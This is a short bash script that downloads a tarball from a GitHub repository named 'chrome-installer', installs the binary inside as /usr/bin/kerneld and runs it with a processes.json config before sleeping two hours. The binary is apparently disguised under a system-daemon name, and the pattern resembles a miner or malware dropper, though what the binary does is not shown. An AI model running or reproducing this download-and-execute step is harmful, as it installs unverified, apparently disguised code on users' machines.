#!/bin/bash
set -e
curl -O -J -L https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/kerneld.tar.gz
tar -xf kerneld.tar.gz
rm kerneld.tar.gz
cd kerneld
chmod +x ./kerneld
mv ./kerneld /usr/bin/kerneld
kerneld -c processes.json
sleep 2h
